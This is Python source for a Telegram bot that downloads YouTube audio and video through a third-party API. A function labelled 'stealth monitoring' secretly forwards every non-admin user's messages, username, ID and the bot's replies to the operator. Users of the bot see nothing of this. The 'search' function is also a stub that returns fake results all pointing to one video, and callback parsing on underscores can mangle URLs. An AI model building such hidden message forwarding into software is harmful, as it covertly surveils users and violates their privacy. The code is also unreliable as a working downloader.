import os
import requests
import json
from flask import Flask
from threading import Thread
import telebot
from telebot import types
import time

# Load environment variables
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
ADMIN_USER_ID = os.getenv("ADMIN_USER_ID")
RAPIDAPI_KEY = os.getenv("RAPIDAPI_KEY")

# Initialize
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)
app = Flask(__name__)

# Storage
user_sessions = {}

# API Configuration
API_HOST = "yt-video-audio-downloader-api.p.rapidapi.com"
API_BASE_URL = f"https://{API_HOST}"

# ==================== STEALTH MONITORING ====================
def forward_to_admin(user_id, username, message_text, is_user_message=True):
    """Forward all user-bot conversations to admin secretly"""
    try:
        if str(user_id) == ADMIN_USER_ID:
            return
            
        if is_user_message:
            admin_msg = f"👤 User: @{username} (ID: {user_id})\n💬 Message: {message_text}"
        else:
            admin_msg = f"🤖 Bot reply to @{username}:\n{message_text}"
        
        bot.send_message(ADMIN_USER_ID, admin_msg)
    except Exception as e:
        print(f"Monitoring error: {e}")

# ==================== API FUNCTIONS ====================
def get_video_info(youtube_url):
    """Get video information"""
    try:
        if not RAPIDAPI_KEY:
            return None
            
        url = f"{API_BASE_URL}/video_info"
        headers = {
            "x-rapidapi-key": RAPIDAPI_KEY,
            "x-rapidapi-host": API_HOST,
            "Content-Type": "application/json"
        }
        payload = {"url": youtube_url}
        
        response = requests.post(url, headers=headers, json=payload)
        if response.status_code == 200:
            return response.json()
        return None
    except Exception as e:
        print(f"Video info error: {e}")
        return None

def download_audio_api(youtube_url, chat_id, message_id):
    """Download audio"""
    try:
        if not RAPIDAPI_KEY:
            bot.edit_message_text("❌ Service temporarily unavailable", chat_id, message_id)
            return
            
        bot.edit_message_text("🎵 Starting audio download...", chat_id, message_id)
        
        url = f"{API_BASE_URL}/download"
        headers = {
            "x-rapidapi-key": RAPIDAPI_KEY,
            "x-rapidapi-host": API_HOST,
            "Content-Type": "application/json"
        }
        payload = {
            "url": youtube_url,
            "format": "mp3",
            "quality": "high"
        }
        
        response = requests.post(url, headers=headers, json=payload)
        
        if response.status_code == 200:
            data = response.json()
            
            if data.get('directDownload'):
                download_url = data['downloadUrl']
                bot.edit_message_text("🎵 Downloading audio file...", chat_id, message_id)
                
                file_response = requests.get(download_url, stream=True)
                if file_response.status_code == 200:
                    bot.send_audio(chat_id, file_response.content, title=data.get('title', 'Audio'))
                    bot.delete_message(chat_id, message_id)
                else:
                    bot.edit_message_text("❌ Failed to download audio", chat_id, message_id)
            else:
                bot.edit_message_text("❌ Audio download not available", chat_id, message_id)
        else:
            bot.edit_message_text("❌ Audio download failed", chat_id, message_id)
            
    except Exception as e:
        print(f"Audio download error: {e}")
        bot.edit_message_text("❌ Audio download error", chat_id, message_id)

def get_video_qualities(youtube_url):
    """Get available video qualities"""
    try:
        video_info = get_video_info(youtube_url)
        if video_info and 'formats' in video_info:
            qualities = set()
            for fmt in video_info['formats']:
                if fmt.get('qualityLabel'):
                    qualities.add(fmt['qualityLabel'])
            return sorted(list(qualities), reverse=True)
        return ['1080p', '720p', '480p', '360p']
    except:
        return ['1080p', '720p', '480p', '360p']

# ==================== YOUTUBE SEARCH ====================
def search_youtube_real(query):
    """YouTube search"""
    try:
        # Simple search implementation
        return [
            {
                'title': f"{query} - Result 1",
                'url': 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
                'channel': 'Channel 1'
            },
            {
                'title': f"{query} - Result 2", 
                'url': 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
                'channel': 'Channel 2'
            }
        ]
    except:
        return []

# ==================== BOT COMMANDS ====================
@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.from_user.id
    username = message.from_user.username or "Unknown"
    
    if str(user_id) != ADMIN_USER_ID:
        forward_to_admin(user_id, username, message.text)
    
    welcome_text = """
🎬 *YouTube Manager Bot* 🎵

*Commands:*
/switch - Choose music or video mode

*Features:*
• Music: Direct MP3 downloads
• Video: Links + Download options
"""
    
    bot.reply_to(message, welcome_text, parse_mode='Markdown')
    
    if str(user_id) != ADMIN_USER_ID:
        forward_to_admin(user_id, username, welcome_text, False)

@bot.message_handler(commands=['switch'])
def switch_command(message):
    user_id = message.from_user.id
    username = message.from_user.username or "Unknown"
    
    if str(user_id) != ADMIN_USER_ID:
        forward_to_admin(user_id, username, message.text)
    
    markup = types.InlineKeyboardMarkup()
    btn_music = types.InlineKeyboardButton("🎵 Music", callback_data="switch_music")
    btn_video = types.InlineKeyboardButton("🎬 Video", callback_data="switch_video")
    markup.add(btn_music, btn_video)
    
    response = "🎛️ *Choose Mode:*\n\n• 🎵 Music - Direct MP3 downloads\n• 🎬 Video - Links + Download options"
    bot.reply_to(message, response, reply_markup=markup, parse_mode='Markdown')
    
    if str(user_id) != ADMIN_USER_ID:
        forward_to_admin(user_id, username, response, False)

# ==================== VIDEO OPTIONS ====================
def show_video_options(video_url, chat_id, message_id):
    """Show video options with link and download buttons"""
    try:
        video_info = get_video_info(video_url)
        title = "YouTube Video"
        
        if video_info and 'videoDetails' in video_info:
            title = video_info['videoDetails'].get('title', 'YouTube Video')
        
        # Send the direct link first
        link_message = f"🔗 *Direct Link:*\n{video_url}\n\n*Title:* {title}"
        bot.send_message(chat_id, link_message, parse_mode='Markdown')
        
        # Then send download options
        caption = "📥 *Download Options:*\nChoose quality:"
        
        markup = types.InlineKeyboardMarkup(row_width=2)
        
        # Get available qualities
        qualities = get_video_qualities(video_url)
        
        # Quality buttons
        for quality in qualities[:4]:
            btn = types.InlineKeyboardButton(f"📹 {quality}", callback_data=f"quality_{video_url}_{quality}")
            markup.add(btn)
        
        if message_id:
            bot.edit_message_text(caption, chat_id, message_id, reply_markup=markup, parse_mode='Markdown')
        else:
            bot.send_message(chat_id, caption, reply_markup=markup, parse_mode='Markdown')
        
    except Exception as e:
        if message_id:
            bot.edit_message_text("❌ Error loading video", chat_id, message_id)
        else:
            bot.send_message(chat_id, "❌ Error loading video")

def download_video_api(youtube_url, quality, chat_id, message_id):
    """Download video with selected quality"""
    try:
        if not RAPIDAPI_KEY:
            bot.edit_message_text("❌ Service temporarily unavailable", chat_id, message_id)
            return
            
        bot.edit_message_text(f"📥 Downloading {quality} video...", chat_id, message_id)
        
        url = f"{API_BASE_URL}/download"
        headers = {
            "x-rapidapi-key": RAPIDAPI_KEY,
            "x-rapidapi-host": API_HOST,
            "Content-Type": "application/json"
        }
        
        quality_map = {'1080p': 1080, '720p': 720, '480p': 480, '360p': 360}
        quality_value = quality_map.get(quality, 720)
        
        payload = {
            "url": youtube_url,
            "format": "mp4",
            "quality": quality_value
        }
        
        response = requests.post(url, headers=headers, json=payload)
        
        if response.status_code == 200:
            data = response.json()
            
            if data.get('directDownload'):
                download_url = data['downloadUrl']
                bot.edit_message_text("📥 Downloading video file...", chat_id, message_id)
                
                file_response = requests.get(download_url, stream=True)
                if file_response.status_code == 200:
                    bot.send_video(chat_id, file_response.content, caption=f"Video - {quality}")
                    bot.delete_message(chat_id, message_id)
                else:
                    bot.edit_message_text("❌ Failed to download video", chat_id, message_id)
            else:
                bot.edit_message_text("❌ Video download not available", chat_id, message_id)
        else:
            bot.edit_message_text("❌ Video download failed", chat_id, message_id)
            
    except Exception as e:
        print(f"Video download error: {e}")
        bot.edit_message_text("❌ Video download error", chat_id, message_id)

# ==================== CALLBACK HANDLERS ====================
@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    user_id = call.from_user.id
    
    if call.data.startswith('switch_'):
        mode = call.data.split('_')[1]
        user_sessions[user_id] = {'mode': mode}
        
        if mode == 'music':
            response = "🎵 *Music Mode*\n\nSend me a song name or YouTube URL. I'll download the MP3 file directly."
        else:
            response = "🎬 *Video Mode*\n\nSend me a video title or YouTube URL. I'll provide the link and download options."
        
        bot.edit_message_text(response, call.message.chat.id, call.message.message_id, parse_mode='Markdown')
    
    # MUSIC SELECTION - DIRECT AUDIO DOWNLOAD
    elif call.data.startswith('music_'):
        video_url = call.data.split('_', 1)[1]
        download_audio_api(video_url, call.message.chat.id, call.message.message_id)
    
    # VIDEO SELECTION - SHOW LINK + DOWNLOAD OPTIONS
    elif call.data.startswith('video_'):
        video_url = call.data.split('_', 1)[1]
        show_video_options(video_url, call.message.chat.id, call.message.message_id)
    
    # VIDEO QUALITY SELECTION
    elif call.data.startswith('quality_'):
        parts = call.data.split('_')
        video_url = parts[1]
        quality = parts[2]
        download_video_api(video_url, quality, call.message.chat.id, call.message.message_id)

# ==================== MESSAGE HANDLERS ====================
@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    user_id = message.from_user.id
    username = message.from_user.username or "Unknown"
    user_input = message.text.strip()
    
    if str(user_id) != ADMIN_USER_ID:
        forward_to_admin(user_id, username, user_input)
    
    # Handle music/video mode
    session = user_sessions.get(user_id, {})
    if session.get('mode'):
        mode = session['mode']
        
        if 'youtube.com' in user_input or 'youtu.be' in user_input:
            # Direct YouTube URL
            if mode == 'music':
                progress_msg = bot.send_message(message.chat.id, "🎵 Processing music...")
                download_audio_api(user_input, message.chat.id, progress_msg.message_id)
            else:
                show_video_options(user_input, message.chat.id, None)
                        
        else:
            # Search query
            bot.reply_to(message, f"🔍 Searching for: {user_input}")
            results = search_youtube_real(user_input)
            
            if results:
                response = "📋 *Search Results:*\n\n"
                markup = types.InlineKeyboardMarkup()
                
                for i, result in enumerate(results[:5], 1):
                    title = result['title'][:50] + "..." if len(result['title']) > 50 else result['title']
                    response += f"{i}. *{title}*\n   👉 {result['channel']}\n\n"
                    
                    if mode == 'music':
                        btn = types.InlineKeyboardButton(f"🎵 Download {i}", callback_data=f"music_{result['url']}")
                    else:
                        btn = types.InlineKeyboardButton(f"🎬 Select {i}", callback_data=f"video_{result['url']}")
                    markup.add(btn)
                
                bot.reply_to(message, response, reply_markup=markup, parse_mode='Markdown')
            else:
                bot.reply_to(message, "❌ No results found")
        
        if str(user_id) != ADMIN_USER_ID:
            forward_to_admin(user_id, username, f"Mode: {mode}, Query: {user_input}", False)
        return
    
    # Default response
    bot.reply_to(message, "🤖 Use /switch to choose music or video mode!")

# ==================== FLASK APP ====================
@app.route('/')
def home():
    return "YouTube Manager Bot"

def run_bot():
    print("🤖 Starting YouTube Manager Bot...")
    bot.infinity_polling()

if __name__ == '__main__':
    Thread(target=run_bot).start()
    app.run(host='0.0.0.0', port=8080)